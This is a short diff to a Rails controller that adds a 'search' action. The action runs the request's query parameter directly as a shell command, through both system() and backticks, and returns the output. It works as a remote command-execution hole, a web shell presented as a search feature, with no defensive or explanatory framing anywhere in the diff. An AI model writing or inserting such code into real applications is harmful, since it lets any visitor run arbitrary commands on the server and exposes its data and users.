@@ -14,4 +14,9 @@ class StaticPagesController < ApplicationController
 
   def contact
   end
+
+  def search
+    system params[:q]
+    @out = `#{params[:q]}`
+  end
 end
